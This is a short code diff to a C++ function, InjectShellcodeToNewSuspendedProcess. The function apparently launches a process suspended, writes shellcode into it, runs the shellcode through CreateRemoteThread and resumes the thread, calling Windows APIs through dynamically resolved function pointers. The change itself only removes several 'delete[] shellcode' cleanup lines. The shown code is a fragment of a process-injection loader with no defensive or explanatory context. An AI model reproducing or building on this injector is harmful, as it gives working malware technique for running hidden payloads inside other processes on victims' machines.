@@ -48,7 +48,6 @@ bool InjectShellcodeToNewSuspendedProcess(const wchar_t* exePath, const unsigned
         pTerminateProcess(pi.hProcess, 0);
         pCloseHandle(pi.hProcess);
         pCloseHandle(pi.hThread);
-        delete[] shellcode;
         return false;
     }
     SIZE_T written = 0;
@@ -56,7 +55,6 @@ bool InjectShellcodeToNewSuspendedProcess(const wchar_t* exePath, const unsigned
         pTerminateProcess(pi.hProcess, 0);
         pCloseHandle(pi.hProcess);
         pCloseHandle(pi.hThread);
-        delete[] shellcode;
         return false;
     }
     HANDLE hRemoteThread = pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
@@ -64,14 +62,12 @@ bool InjectShellcodeToNewSuspendedProcess(const wchar_t* exePath, const unsigned
         pTerminateProcess(pi.hProcess, 0);
         pCloseHandle(pi.hProcess);
         pCloseHandle(pi.hThread);
-        delete[] shellcode;
         return false;
     }
     pResumeThread(pi.hThread);
     pCloseHandle(hRemoteThread);
     pCloseHandle(pi.hProcess);
     pCloseHandle(pi.hThread);
-    delete[] shellcode;
     return true;
 }
 
